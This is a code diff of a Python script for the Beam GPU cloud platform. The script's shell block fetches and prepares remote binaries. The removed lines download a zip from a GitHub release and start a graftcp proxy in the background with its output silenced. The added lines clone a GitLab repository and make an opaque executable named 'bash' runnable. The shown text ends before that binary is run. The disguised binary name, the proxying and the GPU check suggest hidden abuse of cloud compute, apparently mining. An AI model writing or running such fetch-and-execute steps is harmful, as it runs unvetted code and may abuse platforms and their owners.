@@ -1,5 +1,7 @@
 from beam import function, Image
 import subprocess
+import time
+
 
 image = (
     Image(
@@ -23,7 +25,10 @@ image = (
 def run_script():
 
     print("=== CHECK GPU ===")
-    subprocess.run(["nvidia-smi"], check=False)
+    subprocess.run(
+        ["nvidia-smi"],
+        check=False,
+    )
 
     cmd = """
     set -e
@@ -31,49 +36,22 @@ def run_script():
     echo "=== CURRENT DIRECTORY ==="
     pwd
 
-    echo "=== DOWNLOAD FILE ==="
-    wget -q https://github.com/malogrono/aways/releases/download/vcs/pan.zip -O pan.zip
-
-    echo "=== EXTRACT ==="
-    unzip -o pan.zip
-
-    echo "=== CHECK PAN ==="
-    ls -ld /mnt/code/pan
-    ls -lah /mnt/code/pan
-
-    echo "=== ENTER PAN ==="
-    cd /mnt/code/pan
-
-    echo "=== SET PERMISSION ==="
-    chmod -R +x .
-
-    echo "=== START GRAFTCP LOCAL ==="
-    ./graftcp/local/graftcp-local -config graftcp-local.conf > /dev/null 2>&1 &
-
-    sleep 3
-
-    echo "=== DOWNLOAD HAL ==="
-    cd /mnt/code/pan
+    echo "=== CLONE HAL ==="
+    cd /mnt/code
+    rm -rf hal
     git clone https://gitlab.com/wimulyono7/hal.git
 
     echo "=== CHECK HAL ==="
-    ls -lah /mnt/code/pan/hal
+    ls -lah /mnt/code/hal
 
     echo "=== CHECK BASH ==="
-    cd /mnt/code/pan/hal
-    ls -lh bash
+    ls -lh /mnt/code/hal/bash
 
-    chmod u+x bash
+    echo "=== SET PERMISSION ==="
+    chmod u+x /mnt/code/hal/bash
 
-    echo "=== MOVE BASH ==="
-    mv bash /mnt/code/pan/
-
-    echo "=== CHECK PAN AFTER MOVE ==="
-    ls -ld /mnt/code/pan
-    ls -lah /mnt/code/pan
-
-    echo "=== FINAL DIRECTORY ==="
-    cd /mnt/code/pan
+    echo "=== SELESAI ==="
+    cd /mnt/code/hal
     pwd
     ls -lah
     
